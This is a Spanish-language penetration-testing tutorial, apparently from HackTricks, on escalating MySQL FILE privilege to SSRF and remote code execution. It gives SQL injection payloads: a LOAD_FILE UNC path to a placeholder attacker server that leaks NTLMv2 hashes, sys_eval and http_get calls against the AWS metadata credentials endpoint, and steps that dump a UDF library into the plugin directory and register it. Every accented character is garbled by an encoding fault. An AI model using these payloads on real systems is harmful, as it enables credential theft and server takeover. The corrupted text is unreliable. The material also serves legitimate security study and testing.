# Privilegio de archivo MySQL a SSRF/RCE

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### LOAD\_FILE/LOAD DATA/LOAD XML a SSRF

Cada art칤culo de exfiltraci칩n de datos Out of Band en SQL utilizar치 la funci칩n de cadena `LOAD_FILE()` para realizar una solicitud de red. La funci칩n tiene sus propias limitaciones basadas en el sistema operativo en el que se ejecuta y la configuraci칩n con la que se inici칩 la base de datos.

Por ejemplo, si la variable global `secure_file_priv` no est치 establecida, el [valor predeterminado se establece en `/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html), lo que significa que solo puedes usar funciones como `LOAD_FILE('nombrearchivo')` o `LOAD DATA [LOCAL] INFILE 'nombrearchivo' INTO TABLE nombretabla` para leer archivos del directorio `/var/lib/mysql-files/`. Para poder realizar lecturas de archivos fuera de este directorio, la opci칩n `secure_file_priv` debe establecerse en `""`, lo cual solo se puede hacer actualizando el archivo de configuraci칩n de la base de datos o pasando el par치metro de inicio `--secure_file_priv=""` al servicio de la base de datos.

Sin embargo, en circunstancias donde `secure_file_priv` est치 establecido en `""`, deber칤amos poder leer otros archivos en el sistema, asumiendo permisos de lectura de archivos y `file_priv` est치 establecido en `Y` en `mysql.user` para el usuario de la base de datos actual. No obstante, la capacidad de usar estas funciones para realizar llamadas de red es muy dependiente del sistema operativo. Como estas funciones est치n construidas solo para leer archivos, las 칰nicas llamadas de red relevantes que se pueden hacer son a rutas UNC en hosts de Windows ya que la [API de Windows `CreateFileA` que se llama al acceder a un archivo entiende las convenciones de nomenclatura UNC](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file).

Entonces, si tu base de datos objetivo se ejecuta en una m치quina Windows, la consulta de inyecci칩n `x'; SELECT LOAD_FILE('\\\\servidoratacante.ejemplo.com\\a.txt'); -- //` [resultar칤a en la m치quina Windows enviando hashes NTLMv2 en un intento de autenticarse con el servidor controlado por el atacante `\\servidoratacante.ejemplo.com`](https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html).

Este Forjado de Solicitudes del Lado del Servidor (SSRF), aunque 칰til, est치 restringido solo al puerto TCP 445. No puedes controlar el n칰mero de puerto, pero puedes leer informaci칩n de recursos compartidos configurados con permisos de lectura completos. Adem치s, como se ha demostrado con investigaciones anteriores, puedes usar esta capacidad limitada de SSRF para robar hashes y retransmitirlos para obtener shells, por lo que definitivamente es 칰til.

### Funciones Definidas por el Usuario para RCE

Otra t칠cnica interesante con bases de datos MySQL es la capacidad de usar Funciones Definidas por el Usuario (UDF) presentes en archivos de bibliotecas externas que, si est치n presentes en ubicaciones espec칤ficas o en el $PATH del sistema, entonces se pueden acceder desde dentro de MySQL.

Podr칤as usar una Inyecci칩n SQL para **escribir una biblioteca (`.so` o `.dll`** dependiendo de Linux o Windows), que contenga una Funci칩n Definida por el Usuario que pueda realizar solicitudes de red/HTTP, que luego se puede invocar a trav칠s de consultas adicionales.

Esto tiene su propio conjunto de restricciones. Basado en la versi칩n de MySQL, que puedes identificar con `select @@version`, el directorio de donde se pueden cargar los complementos est치 restringido. MySQL por debajo de `v5.0.67` permit칤a que los archivos de biblioteca se cargaran desde la ruta del sistema si la variable `plugin_dir` no estaba establecida. Esto ha cambiado ahora y las versiones m치s recientes tienen la variable **`plugin_dir`** establecida en algo como `/usr/lib/mysql/plugin/`, que generalmente es propiedad de root.

B치sicamente **para que puedas cargar una biblioteca personalizada en MySQL y llamar a una funci칩n de la biblioteca cargada a trav칠s de Inyecci칩n SQL, necesitar칤as**:

* capacidad para **escribir en la ubicaci칩n** especificada en **`@@plugin_dir`** a trav칠s de Inyecci칩n SQL
* **`file_priv`** establecido en **`Y`** en `mysql.user` para el usuario actual de la base de datos
* **`secure_file_priv`** establecido en **`""`** para que puedas leer los bytes crudos de la biblioteca desde una ubicaci칩n arbitraria como la red o un directorio de subidas de archivos en una aplicaci칩n web.

Asumiendo que se cumplen las condiciones anteriores, puedes usar el **enfoque cl치sico de transferir la** [**popular biblioteca UDF de MySQL `lib_mysqludf_sys`**](https://github.com/mysqludf/lib_mysqludf_sys) **al servidor de la base de datos**. Luego podr칤as hacer solicitudes de comandos del sistema operativo como `cURL` o `powershell wget` para realizar SSRF usando la sintaxis

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Hay muchas otras funciones declaradas en esta biblioteca, un an치lisis de las cuales se puede ver [aqu칤](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/). Si eres perezoso como yo, puedes obtener una copia de esta biblioteca UDF, para el sistema operativo objetivo, de una instalaci칩n de metasploit desde el directorio `/usr/share/metasploit-framework/data/exploits/mysql/` y comenzar.

Alternativamente, se han creado bibliotecas UDF espec칤ficamente para proporcionar a la base de datos la capacidad de realizar solicitudes HTTP. Puedes usar [Funci칩n definida por el usuario de MySQL (UDF) para HTTP GET/POST](https://github.com/y-ken/mysql-udf-http) para que la base de datos realice solicitudes HTTP, utilizando la siguiente sintaxis

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Tambi칠n podr칤as [crear tu propia UDF y usarla para la post-explotaci칩n tambi칠n.](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)

En cualquier caso, necesitas transferir la biblioteca al servidor de la base de datos. Puedes hacer esto de varias maneras

1. Usa la funci칩n de cadena `hex()` de MySQL o algo como `xxd -p filename.so | tr -d '\n'` para convertir el contenido de la biblioteca a formato hexadecimal y luego volcarlo en el directorio `@@plugin_dir` usando `x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`
2. Alternativamente, convierte el contenido de `filename.so` a base64 y usa `x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`

Si `@@plugin_dir` no es escribible, entonces no tienes suerte si la versi칩n es superior a `v5.0.67`. De lo contrario, escribe en una ubicaci칩n diferente que est칠 en la ruta y carga la biblioteca UDF desde all칤 usando

* para la biblioteca `lib_mysqludf_sys` - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* para la biblioteca `mysql-udf-http` - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`


Para automatizar esto, puedes usar SQLMap que soporta [el uso de UDF personalizadas a trav칠s de la opci칩n `--udf-inject`](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

Para Inyecciones SQL Ciegas podr칤as redirigir la salida de las funciones UDF a una tabla temporal y luego leer los datos desde all칤 o usar [solicitud DNS introducida dentro de un comando `sys_eval` o `sys_exec` curl](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration).

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
